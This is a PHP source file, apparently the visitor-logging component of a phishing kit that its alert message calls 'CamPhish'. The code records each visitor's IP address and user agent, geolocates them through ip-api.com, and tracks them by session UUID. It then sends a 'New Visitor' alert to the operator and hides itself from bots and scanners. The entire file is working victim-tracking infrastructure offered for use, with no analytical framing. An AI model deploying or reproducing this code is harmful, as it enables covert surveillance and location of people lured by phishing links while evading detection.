<?php
// ip.php — logs visitor IP; fires multi-channel alert
require_once __DIR__ . '/alerts.php';
require_once __DIR__ . '/helpers.php';

$cfg = include __DIR__ . '/config.php';

// ── Bot guard ────────────────────────────────────────────────────
if (($cfg['bot_detection'] ?? true) && is_bot()) {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit();
}

// ── Link expiry guard ────────────────────────────────────────────
if (!check_link_expiry()) {
    http_response_code(410);
    echo json_encode(['status' => 'expired']);
    exit();
}

$ip   = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$ip   = trim(explode(',', $ip)[0]);
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$date = date('dMYHis');
$ts   = date('d-M-Y H:i:s');
$uuid = ($cfg['session_tracking'] ?? true) ? get_visitor_uuid() : 'disabled';

$log_dir = __DIR__ . '/logs/ip';
if (!is_dir($log_dir)) mkdir($log_dir, 0755, true);

// ── Rate-limit: only log same IP once per 30 seconds ─────────────
$rate_file = $log_dir . '/rate_' . md5($ip) . '.tmp';
if (file_exists($rate_file) && (time() - filemtime($rate_file)) < 30) {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit();
}
touch($rate_file);

// ── IP Geolocation via ip-api.com ────────────────────────────────
$geo_info = '';
$geo_json = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp,org,as,mobile,proxy,hosting");
if ($geo_json) {
    $geo = json_decode($geo_json, true);
    if (($geo['status'] ?? '') === 'success') {
        $geo_info = implode(' | ', array_filter([
            $geo['city']       ?? '',
            $geo['regionName'] ?? '',
            $geo['country']    ?? '',
            'ISP: ' . ($geo['isp'] ?? ''),
            ($geo['mobile']  ?? false) ? '📱 Mobile'  : '',
            ($geo['proxy']   ?? false) ? '🔀 Proxy'   : '',
            ($geo['hosting'] ?? false) ? '☁ Hosting'  : '',
        ]));
    }
}

// ── Increment link visit counter ─────────────────────────────────
$visit_num = increment_link_visit();

// ── Per-visit file ───────────────────────────────────────────────
$entry  = "=== Visitor Log ===\n";
$entry .= "Date: $ts\n";
$entry .= "IP: $ip\n";
$entry .= "User-Agent: $ua\n";
$entry .= "Session UUID: $uuid\n";
$entry .= "Visit #: $visit_num\n";
if ($geo_info) $entry .= "Geo: $geo_info\n";
$entry .= str_repeat('=', 40) . "\n";

file_put_contents($log_dir . '/ip_' . $date . '_' . md5($ip) . '.txt', $entry);
file_put_contents($log_dir . '/saved.ip.txt', $entry, FILE_APPEND);
file_put_contents($log_dir . '/ip.log', "ip\n");

// ── Also write per-UUID log ──────────────────────────────────────
if ($uuid !== 'disabled') {
    $uuid_dir = __DIR__ . '/logs/sessions/' . $uuid;
    if (!is_dir($uuid_dir)) mkdir($uuid_dir, 0755, true);
    file_put_contents($uuid_dir . '/timeline.log', "[{$ts}] VISIT | IP: {$ip}\n", FILE_APPEND);
}

// ── Alert ────────────────────────────────────────────────────────
$msg = "🎯 <b>CamPhish — New Visitor!</b>\n📡 IP: <code>{$ip}</code>\n🌐 UA: <code>" . htmlspecialchars($ua) . "</code>\n🕐 $ts" . ($geo_info ? "\n📍 Geo: $geo_info" : '') . "\n🆔 UUID: <code>$uuid</code>\n#️⃣ Visit #$visit_num";
dispatch_alert('visitor', $msg, ['ip' => $ip, 'ua' => $ua, 'geo' => $geo_info, 'uuid' => $uuid, 'visit' => $visit_num]);

header('Content-Type: application/json');
echo json_encode(['status' => 'ok', 'uuid' => $uuid]);
exit();
